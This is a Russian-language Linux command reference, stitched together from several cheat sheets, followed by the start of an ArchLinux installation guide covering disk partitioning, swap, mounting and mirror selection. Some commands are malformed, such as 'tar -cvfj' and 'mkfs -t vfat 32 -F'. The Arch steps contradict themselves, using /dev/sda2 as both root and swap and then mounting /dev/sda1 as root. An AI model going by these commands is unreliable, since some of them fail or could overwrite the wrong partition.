find / -xdev -name "*.rpm"	найти все фалы и директории, имена которых оканчиваются на '.rpm', игнорируя съёмные носители, такие как cdrom, floppy и т.п.
locate "*.ps"	найти все файлы, сожержащие в имени '.ps'. Предварительно рекомендуется выполнить команду 'updatedb'
whereis halt	показывает размещение бинарных файлов, исходных кодов и руководств, относящихся к файлу 'halt'
which halt	отображает полный путь к файлу 'halt'
Монтирование файловых систем
mount /dev/hda2 /mnt/hda2	монтирует раздел 'hda2' в точку монтирования '/mnt/hda2'. Убедитесь в наличии директории-точки монтирования '/mnt/hda2'
umount /dev/hda2	размонтирует раздел 'hda2'. Перед выполнением, покиньте '/mnt/hda2'
fuser -km /mnt/hda2	принудительное размонтирование раздела. Применяется в случае, когда раздел занят каким-либо пользователем
umount -n /mnt/hda2	выполнить размонитрование без занесения информации в /etc/mtab. Полезно когда файл имеет атрибуты "только чтение" или недостаточно места на диске
mount /dev/fd0 /mnt/floppy	монтировать флоппи-диск
mount /dev/cdrom /mnt/cdrom	монтировать CD или DVD
mount /dev/hdc /mnt/cdrecorder	монтировать CD-R/CD-RW или DVD-R/DVD-RW(+-)
mount -o loop file.iso /mnt/cdrom	смонтировать ISO-образ
mount -t vfat /dev/hda5 /mnt/hda5	монтировать файловую систему Windows FAT32
mount -t smbfs -o username=user,password=pass //winclient/share /mnt/share	монтировать сетевую файловую систему Windows (SMB/CIFS)
mount -o bind /home/user/prg /var/ftp/user	"монтирует" директорию в директорию (binding). Доступна с версии ядра 2.4.0. Полезна, например, для предоставления содержимого пользовательской директории через ftp при работе ftp-сервера в "песочнице" (chroot), когда симлинки сделать невозможно. Выполнение данной команды сделает копию содержимого /home/user/prg в /var/ftp/user
Дисковое пространство
df -h	отображает информацию о смонтированных разделах с отображением общего, доступного и используемого пространства (Прим.переводчика. ключ -h работает не во всех *nix системах)
ls -lSr |more	выдаёт список файлов и директорий рекурсивно с сортировкой по возрастанию размера и позволяет осуществлять постраничный просмотр
du -sh dir1	подсчитывает и выводит размер, занимаемый директорией 'dir1' (Прим.переводчика. ключ -h работает не во всех *nix системах)
du -sk * | sort -rn	отображает размер и имена файлов и директорий, с соритровкой по размеру
rpm -q -a --qf '%10{SIZE}t%{NAME}n' | sort -k1,1n	показывает размер используемого дискового пространства, занимаемое файлами rpm-пакета, с сортировкой по размеру (fedora, redhat и т.п.)
dpkg-query -W -f='${Installed-Size;10}t${Package}n' | sort -k1,1n	показывает размер используемого дискового пространства, занимаемое файлами deb-пакета, с сортировкой по размеру (ubuntu, debian т.п.)
Пользователи и группы
groupadd group_name	создать новую группу с именем group_name
groupdel group_name	удалить группу group_name
groupmod -n new_group_name old_group_name	переименовать группу old_group_name в new_group_name
useradd -c "Nome Cognome" -g admin -d /home/user1 -s /bin/bash user1	создать пользователя user1, назначить ему в качестве домашнего каталога /home/user1, в качестве shell'а /bin/bash, включить его в группу admin и добавить комментарий Nome Cognome
useradd user1	создать пользователя user1
userdel -r user1	удалить пользователя user1 и его домашний каталог
usermod -c "User FTP" -g system -d /ftp/user1 -s /bin/nologin user1	изменить атрибуты пользователя
passwd	сменить пароль
passwd user1	сменить пароль пользователя user1 (только root)
chage -E 2005-12-31 user1	установить дату окончания действия учётной записи пользователя user1
pwck	проверить корректность системных файлов учётных записей. Проверяются файлы /etc/passwd и /etc/shadow
grpck	проверяет корректность системных файлов учётных записей. Проверяется файл/etc/group
newgrp [-] group_name	изменяет первичную группу текущего пользователя. Если указать "-", ситуация будет идентичной той, в которой пользователь вышил из системы и снова вошёл. Если не указывать группу, первичная группа будет назначена из /etc/passwd
Выставление/изменение полномочий на файлы
ls -lh	просмотр полномочий на файлы и директории в текущей директории
ls /tmp | pr -T5 -W$COLUMNS	вывести содержимое директории /tmp и разделить вывод на пять колонок
chmod ugo+rwx directory1	добавить полномочия на директорию directory1 ugo(User Group Other)+rwx(Read Write eXecute) - всем полные права. Аналогичное можно сделать таким образом chmod 777 directory1
chmod go-rwx directory1	отобрать у группы и всех остальных все полномочия на директорию directory1.
chown user1 file1	назначить владельцем файла file1 пользователя user1
chown -R user1 directory1	назначить рекурсивно владельцем директории directory1 пользователя user1
chgrp group1 file1	сменить группу-владельца файла file1 на group1
chown user1:group1 file1	сменить владельца и группу владельца файла file1
find / -perm -u+s	найти, начиная от корня, все файлы с выставленным SUID
chmod u+s /bin/binary_file	назначить SUID-бит файлу /bin/binary_file. Это даёт возможность любому пользователю запускать на выполнение файл с полномочиями владельца файла.
chmod u-s /bin/binary_file	снять SUID-бит с файла /bin/binary_file.
chmod g+s /home/public	назначить SGID-бит директории /home/public.
chmod g-s /home/public	снять SGID-бит с директории /home/public.
chmod o+t /home/public	назначить STIKY-бит директории /home/public. Позволяет удалять файлы только владельцам
chmod o-t /home/public	снять STIKY-бит с директории /home/public
Специальные атрибуты файлов
chattr +a file1	позволить открывать файл на запись только в режиме добавления
chattr +c file1	позволяет ядру автоматически сжимать/разжимать содержимое файла.
chattr +d file1	указавет утилите dump игнорировать данный файл во время выполнения backup'а
chattr +i file1	делает файл недоступным для любых изменений: редактирование, удаление, перемещение, создание линков на него.
chattr +s file1	позволяет сделать удаление файла безопасным, т.е. выставленный атрибут s говорит о том, что при удалении файла, место, занимаемое файлом на диске заполняется нулями, что предотвращяет возможность восстановления данных.
chattr +S file1	указывает, что, при сохранении изменений, будет произведена синхронизация, как при выполнении команды sync
chattr +u file1	данный атрибут указывает, что при удалении файла содержимое его будет сохранено и при необходимости пользователь сможет его восстановить
lsattr	показать атрибуты файлов
Архивирование и сжатие файлов
bunzip2 file1.bz2	разжимает файл 'file1.gz'
gunzip file1.gz
gzip file1	сжимает файл 'file1'
bzip2 file1
gzip -9 file1	сжать файл file1 с максимальным сжатием
rar a file1.rar test_file	создать rar-архив 'file1.rar' и включить в него файл test_file
rar a file1.rar file1 file2 dir1	создать rar-архив 'file1.rar' и включить в него file1, file2 и dir1
rar x file1.rar	распаковать rar-архив
unrar x file1.rar
tar -cvf archive.tar file1	создать tar-архив archive.tar, содержащий файл file1
tar -cvf archive.tar file1 file2 dir1	создать tar-архив archive.tar, содержащий файл file1, file2 и dir1
tar -tf archive.tar	показать содержимое архива
tar -xvf archive.tar	распаковать архив
tar -xvf archive.tar -C /tmp	распаковать архив в /tmp
tar -cvfj archive.tar.bz2 dir1	создать архив и сжать его с помощью bzip2(Прим.переводчика. ключ -j работает не во всех *nix системах)
tar -xvfj archive.tar.bz2	разжать архив и распаковать его(Прим.переводчика. ключ -j работает не во всех *nix системах)
tar -cvfz archive.tar.gz dir1	создать архив и сжать его с помощью gzip
tar -xvfz archive.tar.gz	разжать архив и распаковать его
zip file1.zip file1	создать сжатый zip-архив
zip -r file1.zip file1 file2 dir1	создать сжатый zip-архив и со включением в него нескольких файлов и/или директорий
unzip file1.zip	разжать и распаковать zip-архив
DEB пакеты (Debian, Ubuntu и тому подобное)
dpkg -i package.deb	установить / обновить пакет
dpkg -r package_name	удалить пакет из системы
dpkg -l	показать все пакеты, установленные в систему
dpkg -l | grep httpd	среди всех пакетов, установленных в системе, найти пакет содержащий в своём имени "httpd"
dpkg -s package_name	отобразить инфрмацию о конкретном пакете
dpkg -L package_name	вывести список файлов, входящих в пакет, установленный в систему
dpkg --contents package.deb	отобразить список файлов, входящих в пакет, который ешё не установлен в систему
dpkg -S /bin/ping	найти пакет, в который входит указанный файл.
APT - средство управление пакетами (Debian, Ubuntu и тому подобное)
apt-get install package_name	установить / обновить пакет
apt-cdrom install package_name	установить / обновить пакет с cdrom'а
apt-get update	получить обновлённые списки пакетов
apt-get upgrade	обновить пакеты, установленные в систему
apt-get remove package_name	удалить пакет, установленный в систему с сохранением файлов конфигурации
apt-get purge package_name	удалить пакет, установленный в систему с удалением файлов конфигурации
apt-get check	проверить целостность зависимостей
apt-get clean	удалить загруженные архивные файлы пакетов
apt-get autoclean	удалить старые загруженные архивные файлы пакетов
Просмотр содержимого файлов
cat file1	вывести содержимое файла file1 на стандартное устройсво вывода
tac file1	вывести содержимое файла file1 на стандартное устройсво вывода в обратном порядке (последняя строка становиться первой и т.д.)
more file1	постраничный вывод содержимого файла file1 на стандартное устройство вывода
less file1	постраничный вывод содержимого файла file1 на стандартное устройство вывода, но с возможностью пролистывания в обе стороны (вверх-вниз), поиска по содержимому и т.п.
head -2 file1	вывести первые две строки файла file1 на стандартное устройство вывода. По-умолчанию выводится десять строк
tail -2 file1	вывести последние две строки файла file1 на стандартное устройство вывода. По-умолчанию выводится десять строк
tail -f /var/log/messages	выводить содержимое файла /var/log/messages на стандартное устройство вывода по мере появления в нём текста.
Манипуляции с текстом
cat file_originale | [operation: sed, grep, awk, grep и т.п.] > result.txt	общий синтаксис выполнения действий по обработке содержимого файла и вывода результата в новый
cat file_originale | [operazione: sed, grep, awk, grepи т.п.] >> result.txt	общий синтаксис выполнения действий по обработке содержимого файла и вывода результата в существующий файл. Если файл не существует, он будет создан
grep Aug /var/log/messages	из файла '/var/log/messages' отобрать и вывести на стандартное устройство вывода строки, содержащие "Aug"
grep ^Aug /var/log/messages	из файла '/var/log/messages' отобрать и вывести на стандартное устройство вывода строки, начинающиеся на "Aug"
grep [0-9] /var/log/messages	из файла '/var/log/messages' отобрать и вывести на стандартное устройство вывода строки, содержащие цифры
grep Aug -R /var/log/*	отобрать и вывести на стандартное устройство вывода строки, содержащие "Aug", во всех файлах, находящихся в директории /var/log и ниже
sed 's/stringa1/stringa2/g' example.txt	в файле example.txt заменить "string1" на "string2", результат вывести на стандартное устройство вывода.
sed '/^$/d' example.txt	удалить пустые строки из файла example.txt
sed '/ *#/d; /^$/d' example.txt	удалить пустые строки и комментарии из файла example.txt
echo 'esempio' | tr '[:lower:]' '[:upper:]'	преобразовать символы из нижнего регистра в верхний
sed -e '1d' result.txt	удалить первую строку из файла example.txt
sed -n '/string1/p'	отобразить только строки содержашие "string1"
sed -e 's/ *$//' example.txt	удалить пустые символы в в конце каждой строки
sed -e 's/string1//g' example.txt	удалить строку "string1" из текста не изменяя всего остального
sed -n '1,8p;5q' example.txt	взять из файла с первой по восьмую строки и из них вывести первые пять
sed -n '5p;5q' example.txt	вывести пятую строку
sed -e 's/0*/0/g' example.txt	заменить последовательность из любого количества нулей одним нулём
cat -n file1	пронумеровать строки при выводе содержимого файла
cat example.txt | awk 'NR%2==1'	при выводе содержимого файла, не выводить чётные строки файла
echo a b c | awk '{print $1}'	вывести первую колонку. Разделение, по-умолчанию, по проблелу/пробелам или символу/символам табуляции
echo a b c | awk '{print $1,$3}'	вывести первую и треью колонки. Разделение, по-умолчанию, по проблелу/пробелам или символу/символам табуляции
paste file1 file2	объединить содержимое file1 и file2 в виде таблицы: строка 1 из file1 = строка 1 колонка 1-n, строка 1 из file2 = строка 1 колонка n+1-m
paste -d '+' file1 file2	объединить содержимое file1 и file2 в виде таблицы с разделителем "+"
sort file1 file2	отсортировать содержимое двух файлов
sort file1 file2 | uniq	отсортировать содержимое двух файлов, не отображая повторов
sort file1 file2 | uniq -u	отсортировать содержимое двух файлов, отображая только уникальные строки (строки, встречающиеся в обоих файлах, не выводятся на стандартное устройство вывода)
sort file1 file2 | uniq -d	отсортировать содержимое двух файлов, отображая только повторяющиеся строки
comm -1 file1 file2	сравнить содержимое двух файлов, не отображая строки принадлежащие файлу 'file1'
comm -2 file1 file2	сравнить содержимое двух файлов, не отображая строки принадлежащие файлу 'file2'
comm -3 file1 file2	сравнить содержимое двух файлов, удаляя строки встречающиеся в обоих файлах
Преобразование наборов символов и файловых форматов
dos2unix filedos.txt fileunix.txt	конвертировать файл текстового формата из MSDOS в UNIX (разница в символах возврата каретки)
unix2dos fileunix.txt filedos.txt	конвертировать файл текстового формата из UNIX в MSDOS (разница в символах возврата коретки)
recode ..HTML < page.txt > page.html	конвертировать содержимое тестового файла page.txt в html-файл page.html
recode -l | more	вывести список доступных форматов
Анализ файловых систем
badblocks -v /dev/hda1	проверить раздел hda1 на наличие bad-блоков
fsck /dev/hda1	проверить/восстановить целостность linux-файловой системы раздела hda1
fsck.ext2 /dev/hda1	проверить/восстановить целостность файловой системы ext2 раздела hda1
e2fsck /dev/hda1
e2fsck -j /dev/hda1	проверить/восстановить целостность файловой системы ext3 раздела hda1 с указанием, что журнал расположен там же
fsck.ext3 /dev/hda1	проверить/восстановить целостность файловой системы ext3 раздела hda1
fsck.vfat /dev/hda1	проверить/восстановить целостность файловой системы fat раздела hda11
fsck.msdos /dev/hda1
dosfsck /dev/hda1
Форматирование файловых систем
mkfs /dev/hda1	создать linux-файловую систему на разделе hda1
mke2fs /dev/hda1	создать файловую систему ext2 на разделе hda1
mke2fs -j /dev/hda1	создать журналирующую файловую систему ext3 на разделе hda1
mkfs -t vfat 32 -F /dev/hda1	создать файловую систему FAT32 на разделе hda1
fdformat -n /dev/fd0	форматирование флоппи-диска без проверки
mkswap /dev/hda3	создание swap-пространства на разделе hda3
swap-пространство
mkswap /dev/hda3	создание swap-пространства на разделе hda3
swapon /dev/hda3	активировать swap-пространство, расположенное на разделе hda3
swapon /dev/hda2 /dev/hdb3	активировать swap-пространства, расположенные на разделах hda2 и hdb3
Создание резервных копий (backup)
dump -0aj -f /tmp/home0.bak /home	создать полную резервную копию директории /home в файл /tmp/home0.bak
dump -1aj -f /tmp/home0.bak /home	создать инкрементальную резервную копию директории /home в файл /tmp/home0.bak
restore -if /tmp/home0.bak	восстановить из резервной копии /tmp/home0.bak
rsync -rogpav --delete /home /tmp	синхронизировать /tmp с /home
rsync -rogpav -e ssh --delete /home ip_address:/tmp	синхронизировать через SSH-туннель
rsync -az -e ssh --delete ip_addr:/home/public /home/local	синхронизировать локальную директорию с удалённой директорией через ssh-туннель со сжатием
rsync -az -e ssh --delete /home/local ip_addr:/home/public	синхронизировать удалённую директорию с локальной директорией через ssh-туннель со сжатием
dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr 'dd of=hda.gz'	сделать "слепок" локального диска в файл на удалённом компьютере через ssh-туннель
tar -Puf backup.tar /home/user	создать инкрементальную резервную копию директории '/home/user' в файл backup.tar с сохранением полномочий
( cd /tmp/local/ && tar c . ) | ssh -C user@ip_addr 'cd /home/share/ && tar x -p'	копирование содержимого /tmp/local на удалённый компьютер через ssh-туннель в /home/share/
( tar c /home ) | ssh -C user@ip_addr 'cd /home/backup-home && tar x -p'	копирование содержимого /home  на удалённый компьютер через ssh-туннель в /home/backup-home
tar cf - . | (cd /tmp/backup ; tar xf - )	копирование одной директории в другую с сохранением полномочий и линков
find /home/user1 -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents	поиск в /home/user1 всех файлов, имена которых оканчиваются на '.txt', и копирование их в другую директорию
find /var/log -name '*.log' | tar cv --files-from=- | bzip2 > log.tar.bz2	поиск в /var/log всех файлов, имена которых оканчиваются на '.log', и создание bzip-архива из них
dd if=/dev/hda of=/dev/fd0 bs=512 count=1	создать копию MBR (Master Boot Record) с /dev/hda на флоппи-диск
dd if=/dev/fd0 of=/dev/hda bs=512 count=1	восстановить MBR с флоппи-диска на /dev/hda
CDROM
cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force	clean a rewritable cdrom
mkisofs /dev/cdrom > cd.iso	create an iso image of cdrom on disk
mkisofs /dev/cdrom | gzip > cd_iso.gz	create a compressed iso image of cdrom on disk
mkisofs -J -allow-leading-dots -R -V "Label CD" -iso-level 4 -o ./cd.iso data_cd	create an iso image of a directory
cdrecord -v dev=/dev/cdrom cd.iso	burn an ISO image
gzip -dc cd_iso.gz | cdrecord dev=/dev/cdrom -	burn a compressed ISO image
mount -o loop cd.iso /mnt/iso	mount an ISO image
cd-paranoia -B	rip audio tracks from a CD to wav files
cd-paranoia -- "-3"	rip first three audio tracks from a CD to wav files
cdrecord --scanbus	scan bus to identify the channel scsi

Сеть (LAN и WiFi)
ifconfig eth0	показать конфигурацию сетевого интерфейса eth0
ifup eth0	активировать (поднять) интерфейс eth0
ifdown eth0	деактивировать (опустить) интерфейс eth0
ifconfig eth0 192.168.1.1 netmask 255.255.255.0	выставить интерфейсу eth0 ip-адрес и маску подсети
ifconfig eth0 promisc	перевести интерфейс eth0 в promiscuous-режим для "отлова" пакетов (sniffing)
ifconfig eth0 -promisc	отключить promiscuous-режим на интерфейсе eth0
dhclient eth0	активировать интерфейс eth0 в dhcp-режиме.
route -n	вывести локальную таблицу маршрутизации
netstat -rn
route add -net 0/0 gw IP_Gateway	задать ip-адрес шлюза по умолчанию (default gateway)
route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1	добавить статический маршрут в сеть 192.168.0.0/16 через шлюз с ip-адресом 192.168.1.1
route del 0/0 gw IP_gateway	удалить ip-адрес шлюза по умолчанию (default gateway)
echo "1" > /proc/sys/net/ipv4/ip_forward	разрешить пересылку пакетов (forwarding)
hostname	отобразить имя компьютера
host www.linuxguide.it	разрешить имя www.linuxguide.it хоста в ip-адрес и наоборот
host 62.149.140.85
ip link show	отобразить состояние всех интерфейсов
mii-tool eth0	отобразить статус и тип соединения для интерфейса eth0
ethtool eth0	отображает статистику интерфеса eth0 с выводом такой информации, как поддерживаемые и текущие режимы соединения
netstat -tupn	отображает все установленные сетевые соединения по протоколам TCP и UDP без разрешения имён в ip-адреса и PID'ы и имена процессов, обеспечивающих эти соединения
netstat -tupln	отображает все сетевые соединения по протоколам TCP и UDP без разрешения имён в ip-адреса и PID'ы и имена процессов, слушающих порты
tcpdump tcp port 80	отобразить весь трафик на TCP-порт 80 (обычно - HTTP)
iwlist scan	просканировать эфир на предмет, доступности беспроводных точек доступа
iwconfig eth1	показать конфигурацию беспроводного сетевого интерфейса eth1
Microsoft Windows networks(SAMBA)
nbtscan ip_addr	разрешить netbios-имя nbtscan не во всех системах ставится по-умолчанию, возможно, придётся доустанавливать вручную. nmblookup включен в пакет samba.
nmblookup -A ip_addr
smbclient -L ip_addr/hostname	отобразить ресурсы, предоставленные в общий доступ на windows-машине
smbget -Rr smb://ip_addr/share	подобно wget может получить файлы с windows-машин через smb-протокол
mount -t smbfs -o username=user,password=pass //winclient/share /mnt/share	смонтировать smb-ресурс, предоставленный на windows-машине, в локальную файловую систему
IPTABLES (firewall)
iptables -t filter -nL	отобразить все цепочки правил
iptables -nL
iptables -t nat -L	отобразить все цепочки правил в NAT-таблице
iptables -t filter -F	очистить все цепочки правил в filter-таблице
iptables -F
iptables -t nat -F	очистить все цепочки правил в NAT-таблице
iptables -t filter -X	удалить все пользовательские цепочки правил в filter-таблице
iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT	позволить входящее подключение telnet'ом
iptables -t filter -A OUTPUT -p tcp --dport http -j DROP	блокировать исходящие HTTP-соединения
iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT	позволить "прокидывать" (forward) POP3-соединения
iptables -t filter -A INPUT -j LOG --log-prefix "DROP INPUT"	включить журналирование ядром пакетов, проходящих через цепочку INPUT, и добавлением к сообщению префикса "DROP INPUT"
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE	включить NAT (Network Address Translate) исходящих пакетов на интерфейс eth0. Допустимо при использовании с динамически выделяемыми ip-адресами.
iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22	перенаправление пакетов, адресованных одному хосту, на другой хост
Мониторинг и отладка
top	отобразить запущенные процессы, используемые ими ресурсы и другую полезную информацию (с автоматическим обновлением данных)
ps -eafw	отобразить запущенные процессы, используемые ими ресурсы и другую полезную информацию (единожды)
ps -e -o pid,args --forest	вывести PID'ы и процессы в виде дерева
pstree	отобразить дерево процессов
kill -9 98989	"убить" процесс с PID 98989 "на смерть" (без соблюдения целостности данных)
kill -KILL 98989
kill -TERM 98989	Корректно завершить процесс с PID 98989
kill -1 98989	заставить процесс с PID 98989 перепрочитать файл конфигурации
kill -HUP 98989
lsof -p 98989	отобразить список файлов, открытых процессом с PID 98989
lsof /home/user1	отобразить список открытых файлов из директории /home/user1
strace -c ls >/dev/null	вывести список системных вызовов, созданных и полученных процессом ls
strace -f -e open ls >/dev/null	вывести вызовы бибилотек
watch -n1 'cat /proc/interrupts'	отображать прерывания в режиме реального времени
last reboot	отобразить историю перезагрузок системы
last user1	отобразить историю регистрации пользователя user1 в системе и время его нахождения в ней
lsmod	вывести загруженные модули ядра
free -m	показать состояние оперативной памяти в мегабайтах
smartctl -A /dev/hda	контроль состояния жёсткого диска /dev/hda через SMART
smartctl -i /dev/hda	проверить доступность SMART на жёстком диске /dev/hda
tail /var/log/dmesg	вывести десять последних записей из журнала загрузки ядра
tail /var/log/messages	вывести десять последних записей из системного журнала
Другие полезные команды
apropos ...keyword	выводит список комманд, которые так или иначе относятся к ключевым словам. Полезно, когда вы знаете что делает программа, но не помните команду
man ping	вызов руководства по работе с программой, в данном случае, - ping
whatis ...keyword	отображает описание действий указанной программы
mkbootdisk --device /dev/fd0 `uname -r`	создаёт загрузочный флоппи-диск
gpg -c file1	шифрует файл file1 с помощью GNU Privacy Guard
gpg file1.gpg	дешифрует файл file1 с помощью GNU Privacy Guard
wget -r www.example.com	загружает рекурсивно содержимое сайта www.example.com
wget -c www.example.com/file.iso	загрузить файл www.example.com/file.iso с возможностью останова и продолжения в последствии
echo 'wget -c www.example.com/files.iso' | at 09:00	начать закачку в указанное время
ldd /usr/bin/ssh	вывести список библиотек, необходимых для работы ssh
alias hh='history'	назначить алиас hh команде history
ls – список файлов и каталогов
ls -al – форматированный список со скрытыми каталогами и файлами
cd dir – сменить директорию на dir
cd – сменить на домашний каталог
pwd – показать текущий каталог
mkdir dir – создать каталог dir
rm file – удалить file
rm -r dir – удалить каталог dir
rm -f file – удалить форсированно file
rm -rf dir – удалить форсированно каталог dir
cp file1 file2 – скопировать file1 в file2
cp -r dir1 dir2 – скопировать dir1 в dir2; создаст каталог dir2, если он не существует
mv file1 file2 – переименовать или переместить file1 в file2. если file2 существующий каталог - переместить file1 в каталог file2
ln -s file link – создать символическую ссылку link к файлу file
touch file – создать file
cat > file – направить стандартный ввод в file
more file – вывести содержимое file
head file – вывести первые 10 строк file
tail file – вывести последние 10 строк file
tail -f file – вывести содержимое file по мере роста, начинает с последних 10 строк
———————————————————————————————————————————————————————————————-
Управление процессами|

ps – вывести ваши текущие активные процессы
top – показать все запущенные процессы
kill pid – убить процесс с id pid
killall proc – убить все процессы с именем proc
bg – список остановленных и фоновых задач; продолжить выполнение остановленной задачи в фоне
fg – выносит на передний план последние задачи
fg n – вынести задачу n на передний план
Права доступа на файлы
chmod octal file – сменить права file на octal, раздельно для пользователя, группы и для всех добавлением:
4 – чтение (r)
2 – запись (w)
1 – исполнение (x)

Примеры:
chmod 777 – чтение, запись, исполнение для всех
chmod 755 – rwx для владельца, rx для группы и остальных.
Дополнительные опции: man chmod.
———————————————————————————————————————————————————————————————-
SSH|

ssh user@host – подключится к host как user
ssh -p port user@host – подключится к host на порт port как user
ssh-copy-id user@host – добавить ваш ключ на host для user чтобы включить логин без пароля и по ключам
———————————————————————————————————————————————————————————————-
Поиск|

grep pattern files – искать pattern в files
grep -r pattern dir – искать рекурсивно pattern в dir
command | grep pattern – искать pattern в выводе command
locate file – найти все файлы с именем file
———————————————————————————————————————————————————————————————-
Системная информация|

date – вывести текущую дату и время
cal – вывести календарь на текущий месяц
uptime – показать текущий аптайм
w – показать пользователей онлайн
whoami – имя, под которым вы залогинены
finger user – показать информацию о user
uname -a – показать информацию о ядре
cat /proc/cpuinfo – информация ЦПУ
cat /proc/meminfo – информация о памяти
man command – показать мануал для command
df – показать инф. о использовании дисков
du – вывести “вес” текущего каталога
free – использование памяти и swap
whereis app – возможное расположение программы app
which app – какая app будет запущена по умолчанию
———————————————————————————————————————————————————————————————-
Архивация|

tar cf file.tar files – создать tar-архив с именем file.tar содержащий files
tar xf file.tar – распаковать file.tar
tar czf file.tar.gz files – создать архив tar с сжатием Gzip
tar xzf file.tar.gz – распаковать tar с Gzip
tar cjf file.tar.bz2 – создать архив tar с сжатием Bzip2
tar xjf file.tar.bz2 – распаковать tar с Bzip2
gzip file – сжать file и переименовать в file.gz
gzip -d file.gz – разжать file.gz в file
———————————————————————————————————————————————————————————————-
Сеть|

ping host – пропинговать host и вывести результат
whois domain – получить информацию whois для domain
dig domain – получить DNS информацию domain
dig -x host – реверсивно искать host
wget file – скачать file
wget -c file – продолжить остановленную закачку
———————————————————————————————————————————————————————————————-
Установка пакетов|

Установка из исходников:
./configure
make
make install
dpkg -i pkg.deb – установить пакет (Debian)
rpm -Uvh pkg.rpm – установить пакет (RPM)
———————————————————————————————————————————————————————————————-
Клавиатурные сочетания|

Ctrl+C – завершить текущую команду
Ctrl+Z – остановить текущую команду, продолжть с fg на переднем плане или bg в фоне
Ctrl+D – разлогиниться, тоже самое, что и exit
Ctrl+W – удалить одно слово в текущей строке
Ctrl+U – удалить строку
!! - повторить последнюю команду
exit – разлогиниться


http://forum.ubuntu.ru/index.php?topic=14535.15



___________________________________________________________________________________________________________________________________________________________________________________________________________________
***

*Установка archlinux*


-------

Запись образа archlinux на флешку с помощью dd-

# dd bs=4M if=archlinux-2020.01.01-x86_64.iso of=/dev/sde status=progress oflag=sync

---------------

Раскладка клавиатуры

Добавим русскую раскладку клавиатуры:

# loadkeys ru

И загрузим шрифт с поддержкой русского языка:

# setfont cyr-sun16

Подключение к интернет

При установке я использовал проводное подключение по Ethernet. В моем случае установщик автоматически запустил службу dhcpcd и интернет заработал.

Чтобы проверить соединение, попробуйте, работает ли ping:

# ping -c 5 archlinux.org

Если вы подключаетесь к интернет по WiFi, то нужно подключиться к вашей WiFi-сети. Я не пробовал устанавливать ArchLinux на компьютере с WiFi, но приведу выдержки из руководства (отпишитесь, пожалуйста, в комментариях, работает ли этот способ). Сначала необходимо определить название WiFi интерфейса, для этого выполняем команду:

# iwconfig

Затем воспользуемся утилитой wifi-menu:

# wifi-menu имя_интерфейса


Настройка часов

Включите синхронизацию времени через интернет:

# timedatectl set-ntp true

Теперь необходимо установить часовой пояс. Для просмотра доступных часовых поясов воспользуйтесь командой:

# timedatectl list-timezones

Можно, например, вывести доступные часовые зоны для Европы:

# timedatectl list-timezones | grep Europe

Установите ваш часовой пояс:

# timedatectl set-timezone Europe/Moscow

Для проверки времени используется команда:

# timedatectl status

Убедитесь, что в поле «Local time» указано верное время.


Разметка дисков при установке ArchLinux рядом с другой ОС

 
Рассмотрим случай, когда вы устанавливаете ArchLinux на компьютер, на котором уже установлена другая операционная система. Это может быть Windows или, например, другой дистрибутив Linux. В моем случае это как раз другой дистрибутив Linux. Если вы устанавливаете ArchLinux рядом с Windows, то создание разделов будет происходить аналогично. Если вы устанавливаете ArchLinux на чистый диск, то этот параграф вы можете пропустить.

Если вы новичок, я рекомендую вам прочитать предыдущий параграф, где описано создание разделов на пустом диске, так как в данном параграфе я буду предельно краток. Также обращаю внимание на то, что я описываю именно мой случай, в вашем случае названия разделов могут отличаться.

Сначала посмотрим, какие разделы на данный момент у нас на диске. Выполняем команду:

# fdisk -l

У меня на диске пять разделов — /dev/sda1,2,5,6,7. Раздел /dev/sda1 это расширенный раздел (extended). Внутри этого раздела размещены разделы /dev/sda5,6,7. На этих разделах уже установлен другой дистрибутив Linux (они используются дистрибутивом).

Для MBR первичных разделов на диске может быть всего 4, они всегда имеют номера от 1 до 4. Если раздел имеет номер 5, 6, 7 и т.д, то это уже логический раздел, который находится внутри расширенного раздела. Расширенный раздел это первичный раздел, который не содержит собственной файловой системы, а содержит другие логические разделы. Нельзя создать пять или более первичных разделов.

Меня интересует раздел /dev/sda2. Это первичный раздел (primary). На него я и буду устанавливать ArchLinux. На самом деле у вас такого раздела может и не существовать. У вас может быть просто неразмеченное свободное пространство на диске, которое мы будем использовать для создания нового раздела. Так как у меня раздел уже создан, то я его сначала удалю (хотя это и не обязательно). После удаления данного раздела, мы как раз получим ситуацию, когда на диске появится свободное незадействованное пространство.

Запускаем утилиту fdisk:

# fdisk /dev/sda

Сначала я удалю раздел /dev/sda2. Вводим команду d. Вводим номер раздела: 2. Получаем сообщение «Partition 2 has been deleted». Раздел удален, значит у нас появилось свободное неразмеченное пространство на диске, которое мы будем использовать для создания нового раздела.

Вводим команду n, чтобы создать новый раздел. Все предлагаемые настройки оставляем по умолчанию (первичный раздел, номер раздела 2), то есть просто нажимаем Enter. Мне еще был задан вопрос «Do you want to remove the signature?», я ввел y.

Мы создали раздел /dev/sda2, который будет использоваться для установки ArchLinux. Запишем изменения, для этого вводим команду w.

Отформатируем только что созданный раздел. Выполняем команду:

# mkfs.ext4 /dev/sda2


Инициализация swap

Если во время разметки диска вы создали раздел подкачки, или же он уже был на вашем диске, то его необходимо инициализировать. Выполняем команды (/dev/sda2 — это раздел подкачки):

# mkswap /dev/sda2 swapon /dev/sda2



Монтирование разделов

Примонтируем наш корневой раздел /dev/sda1 в директорию /mnt:

# mount /dev/sda1 /mnt

Выбор серверов-зеркал

Во время установки из интернета скачиваются пакеты. Пакеты размещаются на серверах-зеркалах.

Можно выбрать географически ближайший к вам сервер, чтобы загрузка пакетов происходила быстрее. Для этого нужно отредактировать файл /etc/pacman.d/mirrorlist. В этом файле представлен список серверов. Чем выше в списке расположен сервер, тем выше его приоритет, поэтому ближайший к вам сервер желательно переместить наверх списка.

Во время установки этот файл будет скопирован в вашу систему, и список серверов из файла будет использоваться при установке новых пакетов или при обновлении системы.

Откройте файл /etc/pacman.d/mirrorlist для редактирования:

# nano /etc/pacman.d/mirrorlist

Мы открыли файл в консольном редакторе nano. Я перенес сервер от Яндекс (это строка «Server = http://mirror.yandex.ru/archlinux/$repo/os/$arch») наверх списка.

